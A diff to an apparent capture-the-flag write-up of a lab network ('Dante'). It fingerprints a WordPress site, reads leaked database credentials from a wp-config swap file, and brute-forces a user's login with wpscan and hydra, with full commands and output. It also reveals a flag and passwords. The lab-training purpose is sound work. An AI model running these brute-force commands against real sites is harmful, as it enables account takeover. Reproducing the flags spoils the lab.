@@ -174,6 +174,12 @@ $ sudo nmap -vv -sV -A -p21,22,65000  -oN host_100.txt 10.10.110.100
 
 > FIRST FLAG `DANTE{Y0u_Cant_G3t_at_m3_br0!}`
 
+```bash
+$ whatweb -a 1 http://10.10.110.100:65000/wordpress  
+
+http://10.10.110.100:65000/wordpress/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.110.100], MetaGenerator[WordPress 5.4.1], PoweredBy[-wordpress,-wordpress,,WordPress], Script, Title[Dante LLC], UncommonHeaders[link], WordPress[5.4.1]
+```
+
 /wordpress - Website found
 
 ![Possible Wordpress version](/img/Wordpress_version.png)
@@ -193,3 +199,68 @@ $ sudo nmap -vv -sV -A -p21,22,65000  -oN host_100.txt 10.10.110.100
 /xmlrpc.php           (Status: 405) [Size: 42]
 
 ```
+
+Since website built on wordpress so performed `wpscan`
+
+```bash
+$ wpscan --url http://10.10.110.100:65000/wordpress/ -U james -P /home/kali/SecLists/Passwords/500-worst-passwords.txt
+```
+
+OUTPUT
+```
+[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+```
+
+also found *swp* file of wp-config
+```bash
+[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp
+ | Found By: Direct Access (Aggressive Detection)
+```
+
+OUTPUT:
+```bash
+DANTE-WEB-NIX01
+/var/www/html/wordpress/wp-config.php
+define( 'DB_COLLATE', '' );
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_CHARSET', 'utf8mb4' );
+/** Database Charset to use in creating database tables. */
+define( 'DB_HOST', 'localhost' );
+/** MySQL hostname */
+define( 'DB_PASSWORD', 'password' );
+/** MySQL database password */
+define( 'DB_USER', 'shaun' );
+/** MySQL database username */
+define( 'DB_NAME', 'wordpress' );
+```
+* No public exploit found for `twentytwenty`
+* Not able to crack password of `james` and `admin` using wpscan
+
+***As We know james don't have secure password***
+so i will try again to bruteforce but this time with `hydra` because it is fast
+
+```bash
+hydra -l james -P /home/kali/SecLists/Passwords/dutch_common_wordlist.txt http-post-form://10.10.110.100:65000/wordpress/wp-login.php:"log=^USER^&pwd=^PASS^&wp-submit=Log+In":"incorrect" -I 
+
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-10 16:45:38
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 5446762 login tries (l:1/p:5446762), ~340423 tries per task
+[DATA] attacking http-post-form://10.10.110.100:65000/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect
+[STATUS] 972.00 tries/min, 972 tries in 00:01h, 5445790 to do in 93:23h, 16 active
+[STATUS] 1026.00 tries/min, 3078 tries in 00:03h, 5443684 to do in 88:26h, 16 active
+[STATUS] 1044.14 tries/min, 7309 tries in 00:07h, 5439453 to do in 86:50h, 16 active
+[65000][http-post-form] host: 10.10.110.100   login: james   password: Toyota
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-10 16:53:53
+```
+
+> **ABLE TO BRUTEFORCE `James` Password `Toyota`
